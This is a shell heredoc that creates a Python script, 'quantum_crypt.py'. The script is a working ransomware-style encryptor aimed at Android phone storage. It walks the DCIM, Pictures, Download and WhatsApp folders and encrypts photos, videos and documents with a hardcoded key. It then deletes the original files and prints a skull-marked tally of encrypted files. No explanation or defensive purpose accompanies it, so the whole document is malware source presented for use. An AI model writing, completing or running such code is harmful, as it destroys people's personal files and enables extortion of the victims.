cat > quantum_crypt.py << 'EOF'
#!/usr/bin/env python3
import os
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes

class QuantumEncryptor:
    def __init__(self):
        self.password = "QUANTUM_Ω_VERSE_2024☠️"
        self.salt = b'quantum_salt_1337'
        self.key = PBKDF2(self.password, self.salt, 32, count=100000)
        self.target_extensions = [
            '.txt', '.jpg', '.jpeg', '.png', '.mp4', '.mp3', '.pdf',
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx'
        ]
        
    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as f: data = f.read()
            iv = get_random_bytes(16)
            cipher = AES.new(self.key, AES.MODE_GCM, iv)
            enc, tag = cipher.encrypt_and_digest(data)
            with open(file_path + '.quantum', 'wb') as f: f.write(iv + tag + enc)
            os.remove(file_path)
            return True
        except: return False
    
    def scan_and_encrypt(self):
        enc = 0
        paths = ['/sdcard', '/storage/emulated/0']
        folders = ['DCIM', 'Pictures', 'Download', 'WhatsApp']
        for base in paths:
            if not os.path.exists(base): continue
            for folder in folders:
                folder_path = os.path.join(base, folder)
                if os.path.exists(folder_path):
                    for root, dirs, files in os.walk(folder_path):
                        for file in files:
                            if any(file.lower().endswith(ext) for ext in self.target_extensions):
                                if self.encrypt_file(os.path.join(root, file)):
                                    enc += 1
        return enc

if __name__ == '__main__':
    enc = QuantumEncryptor()
    total = enc.scan_and_encrypt()
    print(f'[☠️] Encrypted: {total} files')
EOF
